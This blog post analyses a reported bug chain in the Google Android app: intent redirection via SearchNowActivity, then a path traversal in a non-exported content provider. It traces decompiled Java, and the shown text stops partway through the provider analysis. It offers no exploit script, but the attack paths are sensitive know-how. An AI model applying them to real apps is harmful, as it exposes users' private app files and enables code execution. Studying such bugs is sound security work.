<!DOCTYPE html>
<html lang="en-us"><head>
  <meta charset="utf-8">

  
  <script data-ad-client="ca-pub-9039902373505756" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6J58MYYPV"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-Z6J58MYYPV');
  </script>
  <title>Cesar Rodriguez | Personal blog</title>

  <!-- mobile responsive meta -->
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Android bug">
  <meta name="author" content="Cesar Rodriguez">
  <meta name="generator" content="Hugo 0.70.0" />

  <!-- plugins -->
  
  <link rel="stylesheet" href="https://cmrodriguez.me/plugins/bootstrap/bootstrap.min.css ">
  
  <link rel="stylesheet" href="https://cmrodriguez.me/plugins/slick/slick.css ">
  
  <link rel="stylesheet" href="https://cmrodriguez.me/plugins/themify-icons/themify-icons.css ">
  
  <link rel="stylesheet" href="https://cmrodriguez.me/plugins/venobox/venobox.css ">
  

  <!-- Main Stylesheet -->
  
  <link rel="stylesheet" href="https://cmrodriguez.me/scss/style.min.css" media="screen">

  <!--Favicon-->
  <link rel="shortcut icon" href="https://cmrodriguez.me/images/favicon.png " type="image/x-icon">
  <link rel="icon" href="https://cmrodriguez.me/images/favicon.png " type="image/x-icon">

</head><body>
<!-- preloader start -->
<div class="preloader">
  
</div>
<!-- preloader end -->
<!-- navigation -->
<header class="navigation">
  <div class="container">
    
    <nav class="navbar navbar-expand-lg navbar-white bg-transparent border-bottom pl-0">
      <a class="navbar-brand mobile-view" href="https://cmrodriguez.me"><img class="img-fluid" style="max-height: 5rem;"
          src="https://cmrodriguez.me/images/logo-hermosa2.png" alt="Cesar Rodriguez | Personal blog"></a>
      <button class="navbar-toggler border-0" type="button" data-toggle="collapse" data-target="#navigation">
        <i class="ti-menu h3"></i>
      </button>

      <div class="collapse navbar-collapse text-center" id="navigation">
        <div class="desktop-view">
          <ul class="navbar-nav mr-auto">
            
            <li class="nav-item">
              <a class="nav-link" href="https://twitter.com/warlockk87"><i class="ti-twitter-alt"></i></a>
            </li>
            
            <li class="nav-item">
              <a class="nav-link" href="https://github.com/CesarMRodriguez"><i class="ti-github"></i></a>
            </li>
            
            <li class="nav-item">
              <a class="nav-link" href="https://www.linkedin.com/in/cesar-mario-rodriguez/"><i class="ti-linkedin"></i></a>
            </li>
            
            <li class="nav-item">
              <a class="nav-link" href="https://www.instagram.com/cesarm_rodriguez/"><i class="ti-instagram"></i></a>
            </li>
            
          </ul>
        </div>

        <a class="navbar-brand mx-auto desktop-view" href="https://cmrodriguez.me"><img class="img-fluid" style="max-height: 5rem;"
            src="https://cmrodriguez.me/images/logo-hermosa2.png" alt="Cesar Rodriguez | Personal blog"></a>

        <ul class="navbar-nav">
          
          
          <li class="nav-item">
            <a class="nav-link" href="https://cmrodriguez.me/about">About</a>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="https://cmrodriguez.me/blog">Post</a>
          </li>
          
          
          
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true"
              aria-expanded="false">
              Guides
            </a>
            <div class="dropdown-menu">
              
              <a class="dropdown-item" href="https://cmrodriguez.me/blog/frida-scripting-guide">Frida Scripting Guide</a>
              
              <a class="dropdown-item" href="https://cmrodriguez.me/blog/hpandro">Solving hpAndro</a>
              
            </div>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="https://cmrodriguez.me/contact">Contact</a>
          </li>
          
          
        </ul>

        
        <!-- search -->
        <div class="search pl-lg-4">
          <button id="searchOpen" class="search-btn"><i class="ti-search"></i></button>
          <div class="search-wrapper">
            <form action="https://cmrodriguez.me/search" class="h-100">
              <input class="search-box px-4" id="search-query" name="s" type="search" placeholder="Type & Hit Enter...">
            </form>
            <button id="searchClose" class="search-close"><i class="ti-close text-dark"></i></button>
          </div>
        </div>
        

        
      </div>
    </nav>
  </div>
</header>
<!-- /navigation -->

<section class="section-sm">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 mx-auto">
        
        <a href="/categories/android"
          class="text-primary">Android</a>
        
        <a href="/categories/bug"
          class="text-primary">Bug</a>
        
        <h2>Analyzing bug - Dynamic Code Loading on Google App</h2>
        <div class="mb-3 post-meta">
          <span>By Cesar Rodriguez</span>
          
          <span class="border-bottom border-primary px-2 mx-1"></span>
          <span>30 June 2021</span>
          
        </div>
        
        <img src="https://cmrodriguez.me/images/featured-post/code-detective.png" class="img-fluid w-100 mb-4" alt="Analyzing bug - Dynamic Code Loading on Google App">
        
        <div class="content mb-5">
          <p>In this post I&rsquo;ll do an analysis of the vulnerability found in analized the bug found on the Google application <em>com.google.android.googlequicksearchbox</em>. The original post can be found in the following <a href="https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">Oversecured post</a></p>
<p>The first time I read it, I could get the idea of the vulnerability found on the explanation, but I had a hard time to understand the path the application takes in order to exploit it. This is because the researcher that did the post showed the output of the tool they used to find the bugs (particularly the intent redirection). So I decided to download the apk and then doing a static analysis on it to figure out how the vulnerability really worked.</p>
<p>The original post did not point the particular version used to execute the analysis. It just stated that the bug was fixed in May. So I went to apkpure, and downloaded the newest version from April. In this case the version was: <em>v12.15.9.23</em>.</p>
<p>Initially the bug is a chain of three different bugs:</p>
<p>a- Intent redirection. This bug lets an attacker to consume any component declared by the application (even non exported ones)
b- Unrestricted read/write file. In this case there is a content provider which gives access to any file in the application folder with read and write rights. It is not exported, but as there was found an Intent redirection, it can be used as well.
c- Google play command execution. Whenever a file is stored in a particular folder, the application loads it in the ClassLoader.</p>
<p>After all the steps are followed, the remaining step is the call of any component that triggers a deserialization (I&rsquo;ll explain a bit about this later on)</p>
<h3 id="intent-redirection">Intent redirection</h3>
<p>In this case the original post shows the output of the tool, I could see easily two different activities exported:</p>
<ul>
<li>com.google.android.apps.gsa.searchnow.SearchNowActivity</li>
<li>com.google.android.googlequicksearchbox.SearchActivity</li>
</ul>
<p>I&rsquo;ll do the analysis on the first one:</p>
<p>The application starts the Activity by calling <em>onCreate</em>. By tracking what is being done with the intent (it is needed to receive parameters from external applications, which is what I am looking for in order to exploit the vulnerability), I found that the application calls the following method:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="n">eVar</span><span class="o">.</span><span class="na">f67447b</span><span class="o">.</span><span class="na">l</span><span class="o">(</span><span class="n">eVar</span><span class="o">.</span><span class="na">f67446a</span><span class="o">.</span><span class="na">getIntent</span><span class="o">(),</span> <span class="n">a2</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</code></pre></div><p>Let&rsquo;s dissect this line of code:</p>
<ul>
<li>eVar.f67446a is the SearchNowActivity, so the first parameter is the intent received by the activity when it is called:</li>
<li>a2 is the Bundle received by the application.</li>
<li>eVar.f67447b is a variable of type: com.google.android.apps.gsa.searchnow.ak. Based on a fast analysis it is not that easy to figure out what this class do.</li>
</ul>
<p>But we do not need to understand it all to follow the flow of the application.</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">   <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">l</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">,</span> <span class="n">Bundle</span> <span class="n">bundle</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">z2</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Intent</span> <span class="n">intent2</span><span class="o">;</span>
        <span class="n">y</span> <span class="n">yVar</span><span class="o">;</span>
        <span class="n">y</span> <span class="n">yVar2</span><span class="o">;</span>
        <span class="n">l</span> <span class="n">lVar</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">z2</span> <span class="o">&amp;&amp;</span> <span class="n">intent</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">intent</span><span class="o">.</span><span class="na">getBooleanExtra</span><span class="o">(</span><span class="s">&#34;reuse_search_now_activity&#34;</span><span class="o">,</span> <span class="kc">false</span><span class="o">))</span> <span class="o">{</span>
           <span class="c1">//reuse_search_now_activity is not being set on the exploit
</span><span class="c1"></span>        <span class="o">}</span>
        <span class="k">this</span><span class="o">.</span><span class="na">E</span> <span class="o">=</span> <span class="n">intent</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">K</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">intent</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="kt">boolean</span> <span class="n">z3</span> <span class="o">=</span> <span class="n">z2</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">j</span><span class="o">(</span><span class="n">m</span><span class="o">.</span><span class="na">UD</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">intent</span><span class="o">.</span><span class="na">getBooleanExtra</span><span class="o">(</span><span class="s">&#34;show_acp_plate&#34;</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">t</span> <span class="o">=</span> <span class="n">z3</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">z3</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">//show_acp_plate is not being set on the exploit
</span><span class="c1"></span>            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">().</span><span class="na">containsKey</span><span class="o">(</span><span class="s">&#34;KEY_HANDOVER_THROUGH_VELVET&#34;</span><span class="o">))</span> <span class="o">{</span>
                <span class="c1">//intent comes with extras in teh exploit
</span><span class="c1"></span>            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="c1">//intent2 is an Intent sent as a parameter to the application
</span><span class="c1"></span>                <span class="n">intent2</span> <span class="o">=</span> <span class="o">(</span><span class="n">Intent</span><span class="o">)</span> <span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">().</span><span class="na">getParcelable</span><span class="o">(</span><span class="s">&#34;KEY_HANDOVER_THROUGH_VELVET&#34;</span><span class="o">);</span>
                <span class="n">intent</span><span class="o">.</span><span class="na">removeExtra</span><span class="o">(</span><span class="s">&#34;KEY_HANDOVER_THROUGH_VELVET&#34;</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">intent2</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">bundle</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">//using the intent2 here
</span><span class="c1"></span>                <span class="k">this</span><span class="o">.</span><span class="na">f67424e</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">intent2</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="o">...</span>
</code></pre></div><p>So I need to see what f67424e.a does with that intent:</p>
<p>f67424e is an interface: <em>com.google.android.apps.gsa.shared.util.s.g</em>. In order to find which method is being called I need to know which class implements this interface. I looked at the same package to find it:</p>
<ul>
<li>com.google.android.apps.gsa.shared.util.s.c</li>
<li>com.google.android.apps.gsa.shared.util.s.a (which extends c and it implements g). By the transitivity property of classes, a implements g:</li>
</ul>
<p>I checked again the flow of calls done till here, and I found that the class com.google.android.apps.gsa.searchnow.f has the following constructor:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="nf">f</span><span class="o">(</span><span class="n">a</span><span class="o">&lt;</span><span class="n">ak</span><span class="o">&gt;</span> <span class="n">aVar</span><span class="o">,</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">dagger</span><span class="o">.</span><span class="na">a</span><span class="o">&lt;</span><span class="n">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">apps</span><span class="o">.</span><span class="na">gsa</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">s</span><span class="o">.</span><span class="na">a</span><span class="o">&gt;&gt;</span> <span class="n">aVar2</span><span class="o">,</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">dagger</span><span class="o">.</span><span class="na">a</span><span class="o">&lt;</span><span class="n">b</span><span class="o">&gt;&gt;</span> <span class="n">aVar3</span><span class="o">,</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">apps</span><span class="o">.</span><span class="na">gsa</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">r</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">&gt;</span> <span class="n">aVar4</span><span class="o">,</span> <span class="n">a</span><span class="o">&lt;</span><span class="n">aw</span><span class="o">&lt;</span><span class="n">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">apps</span><span class="o">.</span><span class="na">gsa</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">a</span><span class="o">&gt;&gt;</span> <span class="n">aVar5</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f67452a</span> <span class="o">=</span> <span class="n">aVar</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f67453b</span> <span class="o">=</span> <span class="n">aVar2</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f67454c</span> <span class="o">=</span> <span class="n">aVar3</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f67455d</span> <span class="o">=</span> <span class="n">aVar4</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">f67456e</span> <span class="o">=</span> <span class="n">aVar5</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div><p>which is being called in the <em>onCreate</em> method from SearchNowActivity:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="k">this</span><span class="o">.</span><span class="na">f67401j</span> <span class="o">=</span> <span class="k">new</span> <span class="n">f</span><span class="o">(</span><span class="n">aVar</span><span class="o">,</span> <span class="n">b2</span><span class="o">,</span> <span class="n">m</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">aVar3</span><span class="o">),</span> <span class="n">aic</span><span class="o">.</span><span class="na">R</span><span class="o">.</span><span class="na">aH</span><span class="o">(),</span> <span class="n">aic</span><span class="o">.</span><span class="na">R</span><span class="o">.</span><span class="na">f27201c</span><span class="o">.</span><span class="na">bJ</span><span class="o">());</span>
</code></pre></div><p>so this left me with the option of class <em>com.google.android.apps.gsa.shared.util.s.a</em>.</p>
<p>The method called is the following one:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">a</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">m</span><span class="o">(</span><span class="n">intent</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">b</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="kt">boolean</span> <span class="n">a2</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span> <span class="o">&lt;--</span> <span class="k">this</span> <span class="n">method</span> <span class="n">is</span> <span class="n">called</span> <span class="n">in</span> <span class="nf">c</span> <span class="o">(</span><span class="n">superclass</span> <span class="n">of</span> <span class="n">a</span><span class="o">)</span>
</code></pre></div><p>It calls the a implementation on the super class (c):</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">a</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">m</span><span class="o">(</span><span class="n">intent</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="o">...</span>
                <span class="n">KeyguardManager</span> <span class="n">keyguardManager</span> <span class="o">=</span> <span class="o">(</span><span class="n">KeyguardManager</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">&#34;keyguard&#34;</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">SDK_INT</span> <span class="o">&lt;</span> <span class="n">26</span> <span class="o">||</span> <span class="o">!</span><span class="n">keyguardManager</span><span class="o">.</span><span class="na">isKeyguardLocked</span><span class="o">()</span> <span class="o">||</span> <span class="n">keyguardManager</span><span class="o">.</span><span class="na">isDeviceLocked</span><span class="o">()</span> <span class="o">||</span> <span class="o">!(</span><span class="n">context</span> <span class="k">instanceof</span> <span class="n">Activity</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">apps</span><span class="o">.</span><span class="na">gsa</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">r</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span> <span class="n">aVar</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="na">f72126a</span><span class="o">;</span>
                    <span class="n">context</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">l2</span><span class="o">);</span> <span class="o">&lt;---</span> <span class="n">here</span> <span class="n">the</span> <span class="n">application</span> <span class="n">launches</span> <span class="n">the</span> <span class="n">intent</span> <span class="n">received</span> <span class="n">as</span> <span class="n">parameter</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</code></pre></div><p>So this is the chain that allows the exploit of the intent redirection from the SearchNowActivity.</p>
<h3 id="content-provider">Content Provider</h3>
<p>With the previous bug we had access to all the non exported components from a third-party application. So always the next step in order to see the severity of the previous bug is finding a good impact. In this case they found one of the providers with the flag android:grantUriPermissions=&quot;true&rdquo;:</p>
<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;provider</span> <span class="na">android:name=</span><span class="s">&#34;com.google.android.apps.gsa.contentprovider.CommonContentProvider&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;false&#34;</span> <span class="na">android:process=</span><span class="s">&#34;:search&#34;</span> <span class="na">android:authorities=</span><span class="s">&#34;com.google.android.googlequicksearchbox.CommonContentProvider&#34;</span> <span class="na">android:grantUriPermissions=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;</span>
</code></pre></div><p>It contained several handlers, one of which was in the class com.google.android.apps.gsa.staticplugins.g.c.b:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kd">final</span> <span class="n">ParcelFileDescriptor</span> <span class="nf">g</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="n">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">f</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
        <span class="n">File</span> <span class="n">i2</span> <span class="o">=</span> <span class="n">i</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span> <span class="c1">// `/data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/` directory
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">i2</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">N</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">f96308d</span><span class="o">.</span><span class="na">b</span><span class="o">(),</span> <span class="s">&#34;Path not found for uri %s&#34;</span><span class="o">,</span> <span class="n">uri</span><span class="o">,</span> <span class="n">14080</span><span class="o">);</span>
            <span class="n">String</span> <span class="n">valueOf</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">FileNotFoundException</span><span class="o">(</span><span class="n">valueOf</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">!=</span> <span class="n">0</span> <span class="o">?</span> <span class="s">&#34;Path not found for uri &#34;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="n">valueOf</span><span class="o">)</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">&#34;Path not found for uri &#34;</span><span class="o">));</span>
        <span class="o">}</span>
        <span class="n">i2</span><span class="o">.</span><span class="na">mkdirs</span><span class="o">();</span>
        <span class="c1">//uri.getLastPathSegment() unescapes the content received
</span><span class="c1"></span>        <span class="k">return</span> <span class="n">ParcelFileDescriptor</span><span class="o">.</span><span class="na">open</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">i2</span><span class="o">,</span> <span class="n">uri</span><span class="o">.</span><span class="na">getLastPathSegment</span><span class="o">()),</span> <span class="n">ParcelFileDescriptor</span><span class="o">.</span><span class="na">parseMode</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">getDefault</span><span class="o">())));</span> <span class="c1">//path traversal leading to any file in the application folder
</span><span class="c1"></span>    <span class="o">}</span>
</code></pre></div><p>In the original post there is no explanation of how the handlers are configured. There was no easy way to find the class shown in the report, because the code is passed through a deobfuscator (similar in results and syntaxis to the one of jadx), so the classes are not the ones decoded by jadx. I could find the class by checking what the i(uri) did:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">private</span> <span class="kd">final</span> <span class="n">File</span> <span class="nf">i</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">EMPTY</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">File</span> <span class="n">filesDir</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">f96312h</span><span class="o">.</span><span class="na">getFilesDir</span><span class="o">();</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">pathSegments</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">pathSegments</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">pathSegments</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">-</span> <span class="n">2</span><span class="o">);</span>
        <span class="c1">//validates that the path is /data/data/com.google.android.googlequicksearchbox/files/ScreenAssistScreenshots/ or /data/data/com.google.android.googlequicksearchbox/files/ScreenAssistCropScreenshots/
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;ScreenAssistScreenshots&#34;</span><span class="o">)</span> <span class="o">||</span> <span class="n">str</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;ScreenAssistCropScreenshots&#34;</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">filesDir</span><span class="o">,</span> <span class="n">uri</span><span class="o">.</span><span class="na">getEncodedPath</span><span class="o">()).</span><span class="na">getParentFile</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="o">...</span>
</code></pre></div><p><em>com.google.android.apps.gsa.staticplugins.g.c.b</em> is not used directly, it extends an abstract class &ldquo;d&rdquo;:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kd">final</span> <span class="n">ParcelFileDescriptor</span> <span class="nf">g</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="n">String</span> <span class="n">str</span><span class="o">)</span> 
</code></pre></div><p>It is being called in &ldquo;com.google.android.apps.gsa.contentprovider.a.g&rdquo;:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">a</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">j</span> <span class="n">jVar</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">f29642a</span><span class="o">;</span>
        <span class="n">f</span> <span class="n">fVar</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">f29643b</span><span class="o">;</span>
        <span class="n">a</span> <span class="n">aVar</span> <span class="o">=</span> <span class="n">jVar</span><span class="o">.</span><span class="na">f29652b</span><span class="o">;</span>
        <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">fVar</span><span class="o">.</span><span class="na">f29655a</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">fVar</span><span class="o">.</span><span class="na">f29660b</span><span class="o">;</span>
        <span class="n">Pair</span><span class="o">&lt;</span><span class="n">d</span><span class="o">,</span> <span class="n">Uri</span><span class="o">&gt;</span> <span class="n">b2</span> <span class="o">=</span> <span class="n">aVar</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">libraries</span><span class="o">.</span><span class="na">aw</span><span class="o">.</span><span class="na">g</span><span class="o">.</span><span class="na">f186855a</span><span class="o">.</span><span class="na">booleanValue</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">valueOf</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
            <span class="n">String</span> <span class="n">valueOf2</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">b2</span><span class="o">.</span><span class="na">first</span><span class="o">);</span>
            <span class="n">String</span> <span class="n">valueOf3</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">b2</span><span class="o">.</span><span class="na">second</span><span class="o">);</span>
            <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">valueOf</span><span class="o">).</span><span class="na">length</span><span class="o">();</span>
            <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">length</span> <span class="o">+</span> <span class="n">30</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">valueOf2</span><span class="o">).</span><span class="na">length</span><span class="o">()</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">valueOf3</span><span class="o">).</span><span class="na">length</span><span class="o">());</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;openFile(&#34;</span><span class="o">);</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">valueOf</span><span class="o">);</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;) delegated to &#34;</span><span class="o">);</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">valueOf2</span><span class="o">);</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34; uri: &#34;</span><span class="o">);</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">valueOf3</span><span class="o">);</span>
            <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&#34;DynamicHostProvider&#34;</span><span class="o">,</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="o">((</span><span class="n">d</span><span class="o">)</span> <span class="n">b2</span><span class="o">.</span><span class="na">first</span><span class="o">).</span><span class="na">g</span><span class="o">((</span><span class="n">Uri</span><span class="o">)</span> <span class="n">b2</span><span class="o">.</span><span class="na">second</span><span class="o">,</span> <span class="n">str</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div><p>In this case we see that based on the Uri received, the &ldquo;aVar.b&rdquo; method returns a Pair&lt;d, Uri&gt;. In this case d is a Handler, which returns the ParcelFileDescriptor we wanted. This method generates a Uri based on the uri received. The method creates the instance of d</p>
